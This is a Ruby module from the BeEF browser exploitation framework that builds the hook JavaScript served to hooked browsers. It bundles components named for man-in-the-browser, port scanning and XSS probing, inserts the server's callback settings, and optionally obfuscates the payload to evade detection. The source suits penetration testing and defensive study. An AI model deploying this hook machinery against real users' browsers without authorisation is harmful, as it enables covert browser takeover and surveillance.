#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - https://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Core
    module Handlers
      module Modules
        # @note Purpose: avoid rewriting several times the same code.
        module MultiStageBeEFJS
          # Builds the default beefjs library (all default components of the library).
          # @param [Object] req_host The request object
          def multi_stage_beefjs!(req_host)
            config = BeEF::Core::Configuration.instance
            # @note set up values required to construct beefjs
            beef_js = ''
            # @note location of sub files
            beef_js_path = "#{$root_dir}/core/main/client/"

            # @note External libraries (like jQuery) that are not evaluated with Eruby and possibly not obfuscated
            ext_js_sub_files = %w[lib/jquery-1.12.4.min.js lib/jquery-migrate-1.4.1.js lib/evercookie.js lib/json2.js lib/mdetect.js lib/platform.js lib/jquery.blockUI.js lib/bowser-2.11.0.min.js]

            # @note BeEF libraries: need Eruby evaluation and obfuscation
            beef_js_sub_files = %w[beef.js browser.js browser/cookie.js browser/popup.js session.js os.js hardware.js dom.js logger.js net.js updater.js encode/base64.js
                                   encode/json.js net/local.js init.js mitb.js geolocation.js net/dns.js net/connection.js net/cors.js net/requester.js net/xssrays.js net/portscanner.js are.js]
            # @note Load websocket library only if WS server is enabled in config.yaml
            beef_js_sub_files << 'websocket.js' if config.get('beef.http.websocket.enable') == true
            # @note Load webrtc library only if WebRTC extension is enabled
            if config.get('beef.extension.webrtc.enable') == true
              beef_js_sub_files << 'lib/webrtcadapter.js'
              beef_js_sub_files << 'webrtc.js'
            end

            # @note antisnatchor: leave timeout.js as the last one!
            beef_js_sub_files << 'timeout.js'

            ext_js_to_obfuscate = ''
            ext_js_to_not_obfuscate = ''

            # @note If Evasion is enabled, the final ext_js string will be ext_js_to_obfuscate + ext_js_to_not_obfuscate
            # @note If Evasion is disabled, the final ext_js will be just ext_js_to_not_obfuscate
            ext_js_sub_files.each do |ext_js_sub_file|
              if config.get('beef.extension.evasion.enable')
                if config.get('beef.extension.evasion.exclude_core_js').include?(ext_js_sub_file)
                  print_debug "Excluding #{ext_js_sub_file} from core files obfuscation list"
                  # do not obfuscate the file
                  ext_js_sub_file_path = beef_js_path + ext_js_sub_file
                  ext_js_to_not_obfuscate << (File.read(ext_js_sub_file_path) + "\n\n")
                else
                  ext_js_sub_file_path = beef_js_path + ext_js_sub_file
                  ext_js_to_obfuscate << (File.read(ext_js_sub_file_path) + "\n\n")
                end
              else
                # Evasion is not enabled, do not obfuscate anything
                ext_js_sub_file_path = beef_js_path + ext_js_sub_file
                ext_js_to_not_obfuscate << (File.read(ext_js_sub_file_path) + "\n\n")
              end
            end

            # @note construct the beef_js string from file(s)
            beef_js_sub_files.each do |beef_js_sub_file|
              beef_js_sub_file_path = beef_js_path + beef_js_sub_file
              beef_js << (File.read(beef_js_sub_file_path) + "\n\n")
            end

            # @note create the config for the hooked browser session
            hook_session_config = BeEF::Core::Server.instance.to_h

            # @note if http_host="0.0.0.0" in config ini, use the host requested by client
            if !hook_session_config['beef_public'].nil? && (hook_session_config['beef_host'] != hook_session_config['beef_public'])
              hook_session_config['beef_host'] = hook_session_config['beef_public']
              hook_session_config['beef_url'].sub!(/#{hook_session_config['beef_host']}/, hook_session_config['beef_public'])
            end
            if hook_session_config['beef_host'].eql? '0.0.0.0'
              hook_session_config['beef_host'] = req_host
              hook_session_config['beef_url'].sub!(/0\.0\.0\.0/, req_host)
            end

            # @note set the XHR-polling timeout
            hook_session_config['xhr_poll_timeout'] = config.get('beef.http.xhr_poll_timeout')

            # @note set the hook file path and BeEF's cookie name
            hook_session_config['hook_file'] = config.get('beef.http.hook_file')
            hook_session_config['hook_session_name'] = config.get('beef.http.hook_session_name')

            # @note if http_port <> public_port in config ini, use the public_port
            if !hook_session_config['beef_public_port'].nil? && (hook_session_config['beef_port'] != hook_session_config['beef_public_port'])
              hook_session_config['beef_port'] = hook_session_config['beef_public_port']
              hook_session_config['beef_url'].sub!(/#{hook_session_config['beef_port']}/, hook_session_config['beef_public_port'])
              hook_session_config['beef_url'].sub!(/http:/, 'https:') if hook_session_config['beef_public_port'] == '443'
            end

            # @note Set some WebSocket properties
            if config.get('beef.http.websocket.enable')
              hook_session_config['websocket_secure'] = config.get('beef.http.websocket.secure')
              hook_session_config['websocket_port'] = config.get('beef.http.websocket.port')
              hook_session_config['ws_poll_timeout'] = config.get('beef.http.websocket.ws_poll_timeout')
              hook_session_config['ws_connect_timeout'] = config.get('beef.http.websocket.ws_connect_timeout')
              hook_session_config['websocket_sec_port'] = config.get('beef.http.websocket.secure_port')
            end

            # @note populate place holders in the beef_js string and set the response body
            eruby = Erubis::FastEruby.new(beef_js)
            @hook = eruby.evaluate(hook_session_config)

            if config.get('beef.extension.evasion.enable')
              evasion = BeEF::Extension::Evasion::Evasion.instance
              @final_hook = ext_js_to_not_obfuscate + evasion.add_bootstrapper + evasion.obfuscate(ext_js_to_obfuscate + @hook)
            else
              @final_hook = ext_js_to_not_obfuscate + @hook
            end

            # @note Return the final hook to be sent to the browser
            @body << @final_hook
          end

          # Finds the path to js components
          # @param [String] component Name of component
          # @return [String|Boolean] Returns false if path was not found, otherwise returns component path
          def legacy_find_beefjs_component_path(component)
            component_path = component
            component_path.gsub!(/beef./, '')
            component_path.gsub!(/\./, '/')
            component_path.replace "#{$root_dir}/core/main/client/#{component_path}.js"

            return false unless File.exist? component_path

            component_path
          end

          # Builds missing beefjs components.
          # @param [Array] beefjs_components An array of component names
          def legacy_build_missing_beefjs_components(beefjs_components)
            # @note verifies that @beef_js_cmps is not nil to avoid bugs
            @beef_js_cmps = '' if @beef_js_cmps.nil?

            if beefjs_components.is_a? String
              beefjs_components_path = find_beefjs_component_path(beefjs_components)
              raise 'Invalid component: could not build the beefjs file' unless beefjs_components_path

              beefjs_components = { beefjs_components => beefjs_components_path }
            end

            beefjs_components.keys.each do |k|
              next if @beef_js_cmps.include? beefjs_components[k]

              # @note path to the component
              component_path = beefjs_components[k]

              # @note we output the component to the hooked browser
              config = BeEF::Core::Configuration.instance
              if config.get('beef.extension.evasion.enable')
                evasion = BeEF::Extension::Evasion::Evasion.instance
                @body << evasion.obfuscate(File.read(component_path) + "\n\n")
              else
                @body << (File.read(component_path) + "\n\n")
              end

              # @note finally we add the component to the list of components already generated so it does not get generated numerous times.
              if @beef_js_cmps.eql? ''
                @beef_js_cmps = component_path
              else
                @beef_js_cmps += ",#{component_path}"
              end
            end
          end
        end
      end
    end
  end
end
